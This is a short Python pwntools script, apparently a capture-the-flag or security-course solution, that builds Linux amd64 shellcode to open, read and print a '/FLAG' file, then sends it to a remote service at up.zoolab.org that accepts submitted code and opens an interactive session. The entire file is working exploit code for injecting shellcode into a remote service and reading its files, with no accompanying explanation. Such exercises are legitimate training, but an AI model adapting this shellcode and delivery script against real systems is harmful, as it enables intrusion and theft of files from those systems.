#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 生成 shellcode
shellcode = asm(
    shellcraft.pushstr('/FLAG') +
    shellcraft.open('rsp', 0) +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 'rax') +
    shellcraft.exit(0)
)

# 連接到服務器
r = remote('up.zoolab.org', 12341)

# 接收提示
r.recvuntil(b'Enter your code> ')

# 發送 shellcode
r.send(shellcode)

# 進入交互模式
r.interactive()
